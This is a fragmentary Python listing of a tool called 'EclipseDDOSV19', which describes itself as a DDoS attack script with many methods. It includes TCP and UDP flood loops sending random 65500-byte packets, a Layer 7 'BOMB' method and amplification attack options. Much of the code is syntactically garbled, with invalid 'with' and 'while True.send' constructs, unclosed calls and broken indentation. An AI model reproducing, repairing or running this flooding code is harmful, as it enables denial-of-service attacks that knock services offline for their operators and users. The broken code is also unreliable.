...
basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
            datefmt="%H:%M:%S")
logger = getLogger("EclipseDDOSV19")
...
class Layer4(Thread):
    ...
    def TCP(self) -> None:
        bytes = None
        with suppress(Exception), sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM):
            while True.send(bytes=random._urandom(65500):
                continue
    ...
    def UDP(self) -> None:
        bytes = None
        with suppress(Exception), sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM):
            while True.sendto(bytes=random._urandom(65500)
                continue
           while True:
                  port=(random.randint(1,15000000),port)[randport]
            if clock()<duration:
...
class ToolsConsole:
    ...
    def usage():
        print((
                  '* EclipseDDOSV19 - DDoS Attack Script With %d Methods\n'
        ...
        with suppress(IndexError):
            ...
            if method in Methods.LAYER7_METHODS:
                ...
                if method == "BOMB":
                    assert (
                        ...
                        "Install bombardier: "
                        "https://github.com/EclipseDDOSV19/EclipseDDOSV19/wiki/BOMB-method"
                    )
            ...
            if method in Methods.LAYER4_METHODS:
                ...
                if method in Methods.LAYER4_AMP:
                    ...
                    logger.warning("https://github.com/EclipseDDOSV19/EclipseDDOSV19/wiki/Amplification-ddos-attack")
